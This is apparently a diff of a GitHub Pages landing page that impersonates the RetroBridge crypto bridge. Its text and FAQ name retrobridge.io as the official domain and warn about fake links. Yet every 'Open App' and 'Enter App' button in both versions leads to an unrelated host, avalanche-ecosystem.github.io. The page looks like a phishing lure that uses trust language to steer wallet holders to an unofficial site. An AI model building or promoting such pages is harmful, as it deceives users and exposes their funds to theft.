@@ -1,46 +1,120 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Retro Bridge - Open App</title><meta name="description" content="retro bridge opens the official RetroBridge app for cross-chain transfers: connect a wallet, choose networks, review the route, and continue.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://retro-bridge-app.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Retro Bridge - Open App"><meta property="og:description" content="retro bridge opens the official RetroBridge app for cross-chain transfers: connect a wallet, choose networks, review the route, and continue.">
-<meta property="og:url" content="https://retro-bridge-app.github.io/"><meta property="og:image" content="https://retro-bridge-app.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Retro Bridge - Open App"><meta name="twitter:description" content="retro bridge opens the official RetroBridge app for cross-chain transfers: connect a wallet, choose networks, review the route, and continue."><meta name="twitter:image" content="https://retro-bridge-app.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://retro-bridge-app.github.io/#website", "url": "https://retro-bridge-app.github.io/", "name": "RetroBridge"}, {"@type": "WebPage", "@id": "https://retro-bridge-app.github.io/#webpage", "url": "https://retro-bridge-app.github.io/", "name": "Retro Bridge - Open App", "description": "retro bridge opens the official RetroBridge app for cross-chain transfers: connect a wallet, choose networks, review the route, and continue.", "inLanguage": "en", "isPartOf": {"@id": "https://retro-bridge-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://retro-bridge-app.github.io/#org", "name": "RetroBridge", "url": "https://retro-bridge-app.github.io/", "logo": "https://retro-bridge-app.github.io/og-cover.png", "sameAs": ["https://retrobridge.io/", "https://www.alchemy.com/dapps/retro-bridge"]}, {"@type": "WebApplication", "@id": "https://retro-bridge-app.github.io/#app", "name": "Retro Bridge", "url": "https://retro-bridge-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "retro bridge opens the official RetroBridge app for cross-chain transfers: connect a wallet, choose networks, review the route, and continue.", "featureList": ["Official domain: retrobridge.io", "Web3 bridges category", "Ethereum, Base, Arbitrum listed"], "isPartOf": {"@id": "https://retro-bridge-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://retro-bridge-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is RetroBridge?", "acceptedAnswer": {"@type": "Answer", "text": "RetroBridge is a cross-chain asset-transfer app used to move supported tokens between supported networks. It is not the same thing as a centralized exchange withdrawal. Users connect a wallet, select a route, review the quote, and sign transactions. Route availability can change based on liquidity, provider status, token support, and network gas."}}, {"@type": "Question", "name": "What is the official RetroBridge URL?", "acceptedAnswer": {"@type": "Answer", "text": "The official destination listed for the app is https://retrobridge.io/. Users should verify the domain directly in the browser before connecting a wallet. Fake bridge links are common in search ads and social posts, so the URL check matters as much as the token and chain check."}}, {"@type": "Question", "name": "Which chains does RetroBridge support?", "acceptedAnswer": {"@type": "Answer", "text": "Public dapp listings show RetroBridge across networks including Ethereum, Arbitrum, Avalanche, Base, BNB Chain, Polygon, OP Mainnet, Starknet, ZKsync, and Blast. The app itself is the final source for live route support because asset availability, bridge liquidity, and provider limits can change."}}, {"@type": "Question", "name": "How long does a RetroBridge transfer take?", "acceptedAnswer": {"@type": "Answer", "text": "Timing varies by route. Some transfers can settle quickly, while others wait on source-chain confirmations, bridge relayers, liquidity, or destination-chain finality. The quote screen and transaction hashes are more reliable than generic timing claims. If a route is delayed, check the source transaction first before retrying."}}, {"@type": "Question", "name": "Can RetroBridge guarantee an airdrop?", "acceptedAnswer": {"@type": "Answer", "text": "No. Bridge use can create on-chain history, but that does not guarantee any retroactive reward. Airdrop eligibility, if it ever exists, is decided by the relevant project and may exclude repetitive or speculative activity. Treat bridge fees and gas as real costs, not as guaranteed airdrop entries."}}, {"@type": "Question", "name": "What should I do if RetroBridge is stuck?", "acceptedAnswer": {"@type": "Answer", "text": "Record the source transaction hash, destination chain, token, amount, wallet address, and time submitted. Check whether the source transaction succeeded or reverted. If it succeeded but the destination has not arrived, use the app status or official support path with those details instead of sending another identical transfer immediately."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="RetroBridge"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">RetroBridge</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Retro Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="RetroBridge preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>ETH</b> · Base</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-base.png" alt="Base" loading="lazy"><img src="static/net-bnb.png" alt="BNB Smart Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open RetroBridge ↗</a></div>
-      <p class="hero-note">Live preview — open the official RetroBridge app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official domain: retrobridge.io</span><span class="trust-chip">Web3 bridges category</span><span class="trust-chip">Ethereum, Base, Arbitrum listed</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Retro Bridge App</title>
+  <meta name="description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <link rel="canonical" href="https://retro-bridge-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F5F6">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Retro Bridge App">
+  <meta property="og:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <meta property="og:url" content="https://retro-bridge-app.github.io/">
+  <meta property="og:image" content="https://retro-bridge-app.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Retro Bridge App">
+  <meta name="twitter:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://retro-bridge-app.github.io/#website",
+        "url": "https://retro-bridge-app.github.io/",
+        "name": "Retro Bridge App",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://retro-bridge-app.github.io/#app",
+        "name": "Retro Bridge App",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://retro-bridge-app.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://retro-bridge-app.github.io/#organization",
+        "name": "Retro Bridge App",
+        "url": "https://retro-bridge-app.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Retro Bridge App">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Retro Bridge App</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Retro Bridge?</h2><div class="capsule"><strong>RetroBridge</strong> is a <a class="inline-link" href="https://ethereum.org/en/developers/docs/bridges/" rel="noopener noreferrer">cross-chain asset-transfer app</a>; <a href="https://www.alchemy.com/dapps/retro-bridge">Alchemy's profile</a> describes Retro Bridge as a Web3 bridge that streamlines asset transfers across blockchains. The official destination is retrobridge.io, whose page title is All chains, single app.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Retro Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Cross-chain bridge app</b></div><div class="f"><small>Network</small><b>Multi-chain</b></div><div class="f"><small>Custody</small><b>Wallet-signed bridge transfers</b></div><div class="f"><small>Official domain</small><b>retrobridge.io</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>RetroBridge supported networks</h2><div class="intent-a">RetroBridge is positioned as a multi-chain bridge app rather than a single L2 <a class="inline-link" href="https://docs.arbitrum.io/build-decentralized-apps/token-bridging/token-bridge-erc20" rel="noopener noreferrer">canonical bridge</a>. Third-party dapp profiles list support across networks such as Ethereum, Arbitrum, Avalanche, Base, <a class="inline-link" href="https://www.binance.com/en/blog/ecosystem/what-is-bnb-chain-421447824684903934" rel="noopener noreferrer">BNB Chain</a>, Polygon, OP Mainnet, Starknet, ZKsync, and Blast, but live availability should be checked inside the app before sending funds. A bridge route can be unavailable even when both chains are generally supported if the selected asset, amount, or liquidity path is not supported. Confirm the source chain, destination chain, token, and recipient address before signing.</div></div></section><section class="section"><div class="container"><h2>RetroBridge fees and transfer time</h2><div class="intent-a">RetroBridge fees and timing depend on the chosen source chain, destination chain, token, bridge route, and current gas conditions. A transfer may involve source-chain gas, route fees, and destination settlement, so a cached fee estimate is not reliable. Same-chain <a class="inline-link" href="https://www.investopedia.com/tech/what-defi-understanding-decentralized-finance/" rel="noopener noreferrer">DEX swaps</a> and cross-chain transfers have different failure modes; for bridges, the important checks are route provider, estimated arrival, minimum received, and whether the destination wallet needs gas. Use the live app quote and <a class="inline-link" href="https://etherscan.io/tx/0x" rel="noopener noreferrer">block explorer</a> hashes rather than assuming a fixed bridge cost.</div></div></section><section class="section section-alt"><div class="container"><h2>RetroBridge airdrop farming and transaction history</h2><div class="intent-a">Search demand around RetroBridge often includes airdrop or retroactive-activity questions, but no bridge transaction can guarantee an airdrop. If users are bridging for activity history, the defensible approach is to use real routes they understand, keep transaction hashes, and avoid uneconomic transfers made only for speculation. Protocol teams can change eligibility rules, exclude <a class="inline-link" href="https://www.messari.io/report/sybil-resistance-in-airdrops" rel="noopener noreferrer">sybil-like behavior</a>, or never run a <a class="inline-link" href="https://www.investopedia.com/terms/t/token.asp" rel="noopener noreferrer">token distribution</a>. The bridge should be evaluated first as a transfer tool, with airdrop speculation treated as uncertain and not an investment thesis.</div></div></section><section class="section"><div class="container"><h2>RetroBridge failed or stuck transfer</h2><div class="intent-a">A RetroBridge transfer can look stuck while the source transaction confirms, a route relays, or the destination chain settles. Start by checking whether the source-chain transaction succeeded. If it reverted, gas may be spent but funds should remain in the source wallet. If it succeeded, collect the <a class="inline-link" href="https://docs.ethers.org/v6/api/transaction/" rel="noopener noreferrer">transaction hash</a>, source and destination chains, amount, token, and recipient address before contacting support. Do not repeat the same transfer blindly until you know whether the first route is pending, refunded, or complete on the destination chain.</div></div></section><section class="section section-alt"><div class="container"><h2>RetroBridge official app and fake link checks</h2><div class="intent-a">The official RetroBridge destination is retrobridge.io. Before connecting a wallet, confirm the browser domain, avoid sponsored links that imitate the brand, and never enter a seed phrase. A normal bridge flow asks for wallet connection, token approval when needed, and a transaction signature. It should not require <a class="inline-link" href="https://ethereum.org/en/security/" rel="noopener noreferrer">private keys</a>, recovery phrases, or unrelated token approvals. If the wallet prompt shows a different contract, chain, or amount than the app quote, stop and re-check the route from official sources.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Retro Bridge</h2><ol class="steps"><li><b>Open the verified domain</b><span>Use the official app link and confirm the browser shows retrobridge.io before connecting a wallet.</span></li><li><b>Connect a wallet</b><span>Connect the wallet that holds the source-chain asset and keep enough <a class="inline-link" href="https://docs.ethers.org/v5/api/providers/provider/#Provider-getGasPrice" rel="noopener noreferrer">native gas</a> for approvals and transfer transactions.</span></li><li><b>Choose the route</b><span>Select the asset, source network, destination network, amount, and receiving wallet, then compare the route details shown in the app.</span></li><li><b>Review and sign</b><span>Check fees, timing, chain IDs, approvals, and wallet prompts before signing; never share a seed phrase.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official RetroBridge app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open RetroBridge ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>RetroBridge vs canonical L2 bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>RetroBridge</th><th>Alternative</th></tr></thead><tbody><tr><td>Primary fit</td><td>Multi-chain transfer app for many route combinations</td><td>Canonical bridges focus on one ecosystem such as Ethereum to a specific L2</td></tr><tr><td>Route source</td><td>App-selected third-party or integrated paths</td><td>Native bridge contracts controlled by the L2 ecosystem</td></tr><tr><td>Speed</td><td>Can be faster depending on route and liquidity</td><td>Withdrawals may follow protocol finalization windows</td></tr><tr><td>Best user</td><td>Users moving assets across several chains from one interface</td><td>Users who prefer the official bridge for a specific L2</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Retro Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>What is RetroBridge?</h3></summary><div>RetroBridge is a cross-chain asset-transfer app used to move supported tokens between supported networks. It is not the same thing as a centralized exchange withdrawal. Users connect a wallet, select a route, review the quote, and sign transactions. Route availability can change based on liquidity, provider status, token support, and network gas.</div></details><details><summary><h3>What is the official RetroBridge URL?</h3></summary><div>The official destination listed for the app is https://retrobridge.io/. Users should verify the domain directly in the browser before connecting a wallet. Fake bridge links are common in search ads and social posts, so the URL check matters as much as the token and chain check.</div></details><details><summary><h3>Which chains does RetroBridge support?</h3></summary><div>Public dapp listings show RetroBridge across networks including Ethereum, Arbitrum, Avalanche, Base, BNB Chain, Polygon, OP Mainnet, Starknet, ZKsync, and Blast. The app itself is the final source for live route support because asset availability, <a class="inline-link" href="https://defillama.com/bridges" rel="noopener noreferrer">bridge liquidity</a>, and provider limits can change.</div></details><details><summary><h3>How long does a RetroBridge transfer take?</h3></summary><div>Timing varies by route. Some transfers can settle quickly, while others wait on source-chain confirmations, bridge relayers, liquidity, or destination-chain finality. The quote screen and transaction hashes are more reliable than generic timing claims. If a route is delayed, check the source transaction first before retrying.</div></details><details><summary><h3>Can RetroBridge guarantee an airdrop?</h3></summary><div>No. Bridge use can create on-chain history, but that does not guarantee any retroactive reward. Airdrop eligibility, if it ever exists, is decided by the relevant project and may exclude repetitive or speculative activity. Treat bridge fees and gas as real costs, not as guaranteed airdrop entries.</div></details><details><summary><h3>What should I do if RetroBridge is stuck?</h3></summary><div>Record the source transaction hash, destination chain, token, amount, wallet address, and time submitted. Check whether the source transaction succeeded or reverted. If it succeeded but the destination has not arrived, use the app status or official support path with those details instead of sending another identical transfer immediately.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Retro Bridge App">
+      <h1>Retro Bridge App</h1>
+      <p class="value"><strong>Retro Bridge App</strong> moves tokens across Ethereum and L2 networks from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Retro Bridge App &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+      button.classList.toggle("is-switched");
+    });
+  }());
+  </script>
+</body>
+</html>
